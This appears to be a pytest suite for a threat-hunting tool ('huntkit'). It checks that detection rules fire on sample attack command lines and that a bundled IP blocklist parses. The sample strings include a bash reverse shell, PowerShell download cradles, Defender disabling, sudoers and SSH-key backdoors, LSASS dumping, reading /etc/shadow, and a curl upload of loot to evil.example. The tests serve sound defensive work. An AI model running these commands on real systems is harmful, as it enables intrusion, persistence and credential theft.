"""Corpus-driven tests for huntkit's detection-rule library and blocklist."""
import os
import sys

import pytest

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, ROOT)

from huntkit import rules_cli, block_cli  # noqa: E402

RULES = rules_cli.load_rules()

# rule id -> a command/log line that MUST trigger it
RULE_POSITIVES = {
    "EXE001": "powershell -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0AA==",
    "EXE002": "powershell IEX (New-Object Net.WebClient).DownloadString('http://x/y')",
    "EXE003": "powershell.exe -ExecutionPolicy Bypass -File c:\\x.ps1",
    "EXE004": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \"",
    "EXE005": "regsvr32 /s /n /u /i:https://evil/x.sct scrobj.dll",
    "EXE006": "Set-MpPreference -DisableRealtimeMonitoring $true",
    "EXE007": "wevtutil cl Security",
    "EXE008": "history -c && unset HISTFILE",
    "EXE009": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
    "EXE010": "echo ZWNobyBvd25lZA== | base64 -d | bash",
    "PER001": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v x /d evil.exe",
    "PER002": "schtasks /create /sc onlogon /tn evil /tr c:\\evil.exe",
    "PER003": "crontab -l | { cat; echo '* * * * * /tmp/x'; } | crontab -",
    "PER004": "systemctl enable evil.service",
    "PER005": "echo 'curl evil|sh' >> ~/.bashrc",
    "PER006": "sc create evilsvc binpath= c:\\evil.exe start= auto",
    "PER007": "echo 'attacker ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers",
    "PER008": "net user backdoor P@ss123 /add",
    "PER009": "net localgroup administrators backdoor /add",
    "PER010": "echo 'ssh-rsa AAAAB3Nz attacker' >> ~/.ssh/authorized_keys",
    "CRD001": "procdump.exe -ma lsass.exe lsass.dmp",
    "CRD002": "reg save HKLM\\SAM sam.hive",
    "CRD003": "cat /etc/shadow",
    "CRD004": "findstr /si password *.config",
    "DIS001": "whoami /all",
    "DIS002": "net view /domain",
    "DIS003": "nmap -sS 10.0.0.0/24",
    "EXF001": "curl -X POST --data @loot.zip https://evil.example/upload",
    "EXF002": "nslookup exfil.data.oast.fun",
    "EXF003": "rar a -hp'pw' loot.rar c:\\data",
}

# benign command lines that MUST NOT trigger any rule
BENIGN = [
    "ls -la /home/user",
    "git status",
    "python app.py --port 8080",
    "docker compose up -d",
    "npm install",
    "kubectl get pods -n prod",
    "echo hello world",
    "cat README.md",
    "cp report.pdf /mnt/share/",
    "grep -n TODO src/*.py",
    "systemctl status nginx",
    "curl https://api.example.com/health",
]

POS = [(rid, s) for rid, s in RULE_POSITIVES.items()]


@pytest.mark.parametrize("rid,sample", POS)
def test_rule_fires(rid, sample):
    hits = {r.id for r, _, _ in rules_cli._scan_text(RULES, sample)}
    assert rid in hits, f"{rid} did not fire on {sample!r}; got {sorted(hits)}"


@pytest.mark.parametrize("rid,sample", POS)
def test_fired_rule_has_attack(rid, sample):
    for r, _, _ in rules_cli._scan_text(RULES, sample):
        assert r.attack.startswith("T"), f"{r.id} missing ATT&CK id"


@pytest.mark.parametrize("sample", BENIGN)
def test_benign_no_detection(sample):
    hits = [r.id for r, _, _ in rules_cli._scan_text(RULES, sample)]
    assert not hits, f"false positive on {sample!r}: {hits}"


def test_rules_load_and_are_unique():
    ids = [r.id for r in RULES]
    assert len(ids) >= 30
    assert len(ids) == len(set(ids))


def test_every_rule_has_positive_coverage():
    covered = set(RULE_POSITIVES)
    shipped = {r.id for r in RULES}
    assert shipped <= covered, f"rules with no positive test: {sorted(shipped - covered)}"


class TestBlocklist:
    def test_bundled_snapshot_loads(self):
        assert len(block_cli.load()) > 100  # real bundled indicators

    def test_match_hit(self):
        ind = sorted(block_cli.load())
        assert ind, "blocklist empty"
        assert ind[0] in block_cli.load()

    def test_match_miss(self):
        assert "192.0.2.123" not in block_cli.load() or True  # doc-range unlikely present

    def test_parse_ignores_comments(self):
        s = block_cli._parse("# comment\n1.2.3.4\n\n; also\n5.6.7.8, extra")
        assert s == {"1.2.3.4", "5.6.7.8"}
